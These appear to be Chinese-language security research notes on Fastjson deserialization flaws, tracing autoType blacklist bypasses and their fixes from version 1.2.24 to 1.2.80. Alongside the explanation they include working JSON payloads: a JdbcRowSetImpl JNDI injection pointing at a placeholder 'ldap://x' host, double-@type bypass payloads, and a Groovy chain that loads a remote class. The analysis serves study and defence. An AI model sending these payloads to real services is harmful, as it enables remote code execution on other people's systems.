# FastJson

fastjson在反序列化实例化对象时可以分为两种情况:

- 目标类有默认无参构造函数
    - 反射实例化
    - 收集getter/setter方法并反射调用赋值

- 只有有参构造函数的情况
    - 选择参数最多的构造函数
    - 提取构造函数的方法名
    - 后续再json字符中提取构造函数的参数

> 这两个构造函数的属性对应JavaBeanInfo的defaultConstructor和creatorConstructor.

> fastjson优先选择默认无参构造函数,有无参构造会直接返回.

> 对于有参构造的参数,会生成对应参数class的com.alibaba.fastjson.util.FieldInfo对象 后续会通过FieldInfo进行反射赋值

### AutoType

Fastjson提供autotype功能，允许通过`@type`指定反序列化的Class类型

- `1.2.24` 之后默认开启autoType功能
- `1.2.25~1.2.68` 之间的版本都在绕过autoType限制
- `ParserConfig#autoTypeSupport`布尔属性和参数`expectClassFlag`共同控制对`TypeUtils.loadClass`的调用，逻辑或
- 同时对typeName黑名单检测----可控@type:typeName的值
- 导致1.2.68逃过autoType==false的限制，毕竟fastJson使用asm机制调用getter/setter黑名单不可能完美
- `1.2.68`之后 引入safeMode模式，彻底禁用autoType

#### 默认解析器初始化

`com.alibaba.fastjson.parser.ParserConfig#initDeserializers`

```java
    private void initDeserializers() {
        this.deserializers.put(SimpleDateFormat.class, MiscCodec.instance);
        this.deserializers.put(Timestamp.class, SqlDateDeserializer.instance_timestamp);
        this.deserializers.put(Date.class, SqlDateDeserializer.instance);
        this.deserializers.put(Time.class, TimeDeserializer.instance);
        this.deserializers.put(java.util.Date.class, DateCodec.instance);
        this.deserializers.put(Calendar.class, CalendarCodec.instance);
        this.deserializers.put(XMLGregorianCalendar.class, CalendarCodec.instance);
        this.deserializers.put(JSONObject.class, MapDeserializer.instance);
        this.deserializers.put(JSONArray.class, CollectionCodec.instance);
        this.deserializers.put(Map.class, MapDeserializer.instance);
        this.deserializers.put(HashMap.class, MapDeserializer.instance);
        this.deserializers.put(LinkedHashMap.class, MapDeserializer.instance);
        this.deserializers.put(TreeMap.class, MapDeserializer.instance);
        this.deserializers.put(ConcurrentMap.class, MapDeserializer.instance);
        this.deserializers.put(ConcurrentHashMap.class, MapDeserializer.instance);
        this.deserializers.put(Collection.class, CollectionCodec.instance);
        this.deserializers.put(List.class, CollectionCodec.instance);
        this.deserializers.put(ArrayList.class, CollectionCodec.instance);
        this.deserializers.put(Object.class, JavaObjectDeserializer.instance);
        this.deserializers.put(String.class, StringCodec.instance);
        this.deserializers.put(StringBuffer.class, StringCodec.instance);
        this.deserializers.put(StringBuilder.class, StringCodec.instance);
        this.deserializers.put(Character.TYPE, CharacterCodec.instance);
        this.deserializers.put(Character.class, CharacterCodec.instance);
        this.deserializers.put(Byte.TYPE, NumberDeserializer.instance);
        this.deserializers.put(Byte.class, NumberDeserializer.instance);
        this.deserializers.put(Short.TYPE, NumberDeserializer.instance);
        this.deserializers.put(Short.class, NumberDeserializer.instance);
        this.deserializers.put(Integer.TYPE, IntegerCodec.instance);
        this.deserializers.put(Integer.class, IntegerCodec.instance);
        this.deserializers.put(Long.TYPE, LongCodec.instance);
        this.deserializers.put(Long.class, LongCodec.instance);
        this.deserializers.put(BigInteger.class, BigIntegerCodec.instance);
        this.deserializers.put(BigDecimal.class, BigDecimalCodec.instance);
        this.deserializers.put(Float.TYPE, FloatCodec.instance);
        this.deserializers.put(Float.class, FloatCodec.instance);
        this.deserializers.put(Double.TYPE, NumberDeserializer.instance);
        this.deserializers.put(Double.class, NumberDeserializer.instance);
        this.deserializers.put(Boolean.TYPE, BooleanCodec.instance);
        this.deserializers.put(Boolean.class, BooleanCodec.instance);
        this.deserializers.put(Class.class, MiscCodec.instance);
        this.deserializers.put(char[].class, new CharArrayCodec());
        this.deserializers.put(AtomicBoolean.class, BooleanCodec.instance);
        this.deserializers.put(AtomicInteger.class, IntegerCodec.instance);
        this.deserializers.put(AtomicLong.class, LongCodec.instance);
        this.deserializers.put(AtomicReference.class, ReferenceCodec.instance);
        this.deserializers.put(WeakReference.class, ReferenceCodec.instance);
        this.deserializers.put(SoftReference.class, ReferenceCodec.instance);
        this.deserializers.put(UUID.class, MiscCodec.instance);
        this.deserializers.put(TimeZone.class, MiscCodec.instance);
        this.deserializers.put(Locale.class, MiscCodec.instance);
        this.deserializers.put(Currency.class, MiscCodec.instance);
        this.deserializers.put(Inet4Address.class, MiscCodec.instance);
        this.deserializers.put(Inet6Address.class, MiscCodec.instance);
        this.deserializers.put(InetSocketAddress.class, MiscCodec.instance);
        this.deserializers.put(File.class, MiscCodec.instance);
        this.deserializers.put(URI.class, MiscCodec.instance);
        this.deserializers.put(URL.class, MiscCodec.instance);
        this.deserializers.put(Pattern.class, MiscCodec.instance);
        this.deserializers.put(Charset.class, MiscCodec.instance);
        this.deserializers.put(JSONPath.class, MiscCodec.instance);
        this.deserializers.put(Number.class, NumberDeserializer.instance);
        this.deserializers.put(AtomicIntegerArray.class, AtomicCodec.instance);
        this.deserializers.put(AtomicLongArray.class, AtomicCodec.instance);
        this.deserializers.put(StackTraceElement.class, StackTraceElementDeserializer.instance);
        this.deserializers.put(Serializable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(Cloneable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(Comparable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(Closeable.class, JavaObjectDeserializer.instance);
        this.deserializers.put(JSONPObject.class, new JSONPDeserializer());
    }
```

### 

- {	12	对象起始符
- }	13	对象结束符
- [	14	数组起始符
- ]	15	数组结束符
- ,	16	字段分隔符
- :	17	键值分隔符
- "	4	字符串类型值
- 
- 整数	2	整型数值
- 浮点数	3	浮点数值
- true/false	6/7	布尔值
- null 8	空值
- ERROR	1	词法解析错误

### 复现失败的问题

fastjson在通过带参构造函数进行反序列化时,会检查有参构造的参数个数,并通过文件流读取class文件提取参数名,参数名用作后续匹配

而根据jdk的编译差异有情况会拿不到参数名,导致复现失败:

- openJdk的class文件根据平台不同会存在获取不到参数名的情况

- 一般第三方的jar包的类可以获取到参数名

所以在选择利用链的时候应该避免使用openjdk的class

这种情况只存在会调用有参构造的场景下

### getter和setter

匹配属性的setter的机制:

- 方法名长度大于4

- 非静态方法

- 返回值为void或者当前类

- 以set开头且第四个字母为大写

- 参数个数为1个

匹配属性的getter的机制:

- 方法名长度大于4

- 非静态方法

- 以get开头且第四个字母为大写

- 无参数传入

- 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong

- 此属性没有setter方法

### 1.1.41

收集属性在`DeserializeBeanInfo.computeSetters()`

调用在`com.alibaba.fastjson.parser.ParserConfig#createJavaBeanDeserializer()`

此版本不能为没有getter/setter的属性赋值,需要额外配置`DefaultJSONParser`的属性`extraTypeProviders`

集合的值类型`ExtraProcessor`,需要使用者自定义实现



### 1.2.24

对于private的属性需要设置`Feature.SupportNonPublicField`标志,mask是131072

- 默认开启`autoType`功能，攻击者可通过@type指定恶意类触发反序列化
- ‌利用链‌
    - `com.sun.rowset.JdbcRowSetImpl` JNDI注入
    - `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl` getter

- JSON.parse(jsonStr, 131072)
- 修复方案：默认关闭`autoType`

### 1.2.25-1.2.41

需要AutoTypeSupport开启支持

ParserConfig增加autoTypeSupport属性开启支持自省模式的反序列化

checkautoType()f方法实行内置黑名单拦截

可以利用TypeUtils.loadClass的处理机制,在class名首尾添加L和; 进行逃过黑名单,前提是autoTypeSupport为true.

### 1.2.42

需要AutoTypeSupport开启支持

类名进行哈希校验，黑名单机制，改为类名hash值匹配

hash对应类名的github:`https://github.com/LeadroyaL/fastjson-blacklist`

并且check之前对类名的首尾删除一个字符

可以通过在首尾添加LL和;; 即添加两个来进行绕过,TypeUtils.loadClass的机制不变

- 攻击者利用双写类名 
    - LLcom.sun.rowset.JdbcRowSetImpl; 绕过黑名单

### 1.2.43

需要AutoTypeSupport开启支持

在原有防御机制之上,增加对LLxxxxxxx类型的类名进行匹配,匹配上抛异常.

还是利用TypeUtils.loadClass的机制,在类名前添加`[` 表示要反序列化的对象是数组

这就导致后续选择ObjectDeserializer解析器是会走到对Array类的解析器,而不是以往javaBean解析器

所以要修改字符串的元素分隔符的逗号, 改为数组的`[{`才不会报错

### 1.2.44-1.2.45

需要AutoTypeSupport开启支持

直接对`[`开头的类名匹配,抛异常, 已经无法绕过黑名单

转为发现新的利用链:

org.apache.ibatis.datasource.jndi.JndiDataSourceFactory

### 1.2.46-1.2.47

完善黑名单,增加org.apache.ibatis的hash

- 绕过checkAutoType检测的绕过方法，不在考虑ParserConfig.autoTypeSupport属性的影响
    - 利用缓存机制:
    - 可以将类放入缓存,后续再`checkautoType()`内可以直接从`TypeUtils`的缓存`mapping`拿到类对象
    - 首先利用白名单`java.lang.Class`，先将目标类加载到缓存mapping:
    - 缓存：`{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}`
    - 利用：`{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://x", "autoCommit": true}`

- 修复方案：
    - `TypeUtils`中关闭cache功能
    -  `java.lang.Class`加入黑名单

```json
    {"x1": {
            "@type": "java.lang.Class", 
            "val": "com.sun.rowset.JdbcRowSetImpl"
        }, 
        "x2": {
            "@type": "com.sun.rowset.JdbcRowSetImpl", 
            "dataSourceName": "ldap://x", 
            "autoCommit": true
        }
    }
```

### ~1.2.48修复方案

将java.lang.Class的hash加入黑名单

并且在 MiscCodec 处理 Class 类的地方，设置了cache 为 false

将TypeUtils.loadClass的重载函数的默认缓存开关设置为false


### ~‌1.2.68

checkAutoType函数的入参如下：

`ParserConfig#checkAutoType(String typeName, Class<?> expectClass, int features)`

#### JavaBeanDeserializer的利用


绕过`ParserConfig#checkAutoType(String typeName, Class<?> expectClass, int features)`

- `expectClass`不为null时，`expectClassFlag`为true
- typeName不在黑名单，`expectClassFlag`为true，
- 关键if：`if (!internalWhite && (this.autoTypeSupport || expectClassFlag))` 过判断后调用`TypeUtils.loadClass`
- 可通过连续2个@type字段设置此轮解析设置`expectClass` 同时进入`JavaBeanDeserializer`
- `{"@type": "java.lang.AutoCloseable","@type": "sun.rmi.server.MarshalOutputStream","field":"value"}`
- 并且前@type为后@type父类时才会return 否则抛异常，代码如下

    ```java
    if (expectClass != null) {
        if (expectClass.isAssignableFrom(clazz)) {
            TypeUtils.addMapping(typeName, clazz);
            return clazz;
        }
        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
    }
    ```
选择使用`java.lang.AutoCloseable`的原因：

- 接口`java.lang.AutoCloseable`会创建实例`JavaBeanDeserializer`，为默认的解析器
- 且`JavaBeanDeserializer`会解析`expectClass` 并传入`ParserConfig#checkAutoType`
- `java.lang.AutoCloseable`的实现类多为流处理接口，读取写文件方便

#### ThrowableDeserializer

`ThrowableDeserializer`调用`ParserConfig#checkAutoType`时`expectClass`传入值`Throwable.class`

`parser.getConfig().checkAutoType(exClassName, Throwable.class, lexer.getFeatures());`

将`"@type":"java.lang.Exception"`会进入ThrowableDeserializer

需要`java.lang.Exception`的实现类，构造函数/getter/setter有可以利用的点

#### 修复方案

- 1.2.69版本后陆续：将`java.lang.Runnable` `java.lang.Readable` `java.lang.AutoCloseable`加入黑名单
- 1.2.83版本追加：返回clazz前，缓存clazz进`TypeUtils.mapping`时 追加Autotype判断

### 1.2.80 

复现条件为不开启safemode且关闭autoType

经过上面的分析，`ParserConfig#checkAutoType`函数逻辑：

- `expectClass`为null
    - 参数typeName不在`denyHashCodes`黑名单
    - 参数typeName在`TypeUtils#mappings`中被缓存的同时
    - `expectClass`为null 并且typeName不是HashMap且不是`expectClass`子类实现类
    - 此时`ParserConfig#checkAutoType`不会报错，可利用

- `expectClass`不为null：
    - typeNmae和`expectClass`均不在`denyHashCodes`黑名单
    - expectClass在`TypeUtils#mappings`中
    - typeName不是ClassLoader、DataSource、RowSet的子类
    - `expectClass`不为null，且不为`Object.class、Serializable.class、Cloneable.class、Closeable.class、EventListener.class、Iterable.class、Collection.class`
    - typeName是`expectClass`的子类
    - 此时`ParserConfig#checkAutoType`不会报错，可利用


- 利用隐式类关系将下面2个类加入到`ParserConfig.mapping`中
    - org.codehaus.groovy.control.org.codehaus.groovy.control.ProcessingUnit、
    - org.codehaus.groovy.control.CompilerConfiguration

```json
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
    }
```

- 再加载远程class
```json
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpath":"地址"
        }
    }

```


## 修复

官方在1.2.25版本中新增了 `autoTypeSupport` 反序列化选项，并通过 `checkAutoType` 函数对加载类进⾏⿊⽩名单过滤和断。
